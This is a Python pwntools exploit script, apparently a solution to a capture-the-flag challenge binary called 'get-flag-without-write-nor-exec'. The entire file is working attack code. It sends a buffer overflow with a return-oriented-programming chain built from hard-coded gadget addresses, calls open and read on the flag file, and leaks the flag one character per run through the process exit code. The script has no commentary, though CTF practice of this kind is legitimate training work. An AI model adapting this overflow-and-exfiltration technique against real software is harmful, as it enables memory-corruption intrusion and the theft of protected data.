#!/usr/bin/python
from pwn import * 
import time


fix = p64(0x0000000000400b18) # <+24>:    mov    -0x14(%rbp),%edi)
opn = p64(0x4008a0)
poprdi = p64(0x0000000000400d93)
poprsi = p64(0x0000000000400d91)
fn = p64(0x400dba)
ext = p64(0x4008c0)
cld = p64(0x0000000000400b81) # : cld ; add rsp, 0x10 ; pop rbp ; ret
poprbp = p64(0x0000000000400940)
scratch = p64(0x602090)
read = p64(0x400850)
#p = process("./get-flag-without-write-nor-exec")
flag = ""
for i in range(100):
    p = process("./get-flag-without-write-nor-exec")
    #p = process("./copy")
    time.sleep(.05)
    p.sendline("4")
    time.sleep(.1)
    payload = "A" * 24 + poprdi + fn + poprsi + p64(0) *2 +opn + poprdi+ p64(4) + poprsi + scratch *2+ read + poprdi + p64(0) + poprsi + p64(0) *2
    payload = payload + poprbp + p64(u64(scratch)+0x14+i) +fix + "A"*0x28 + ext
    p.sendline(payload)
    p.wait()
    x = p.poll()
    flag += chr(x)
    print flag
    p.close()
print flag
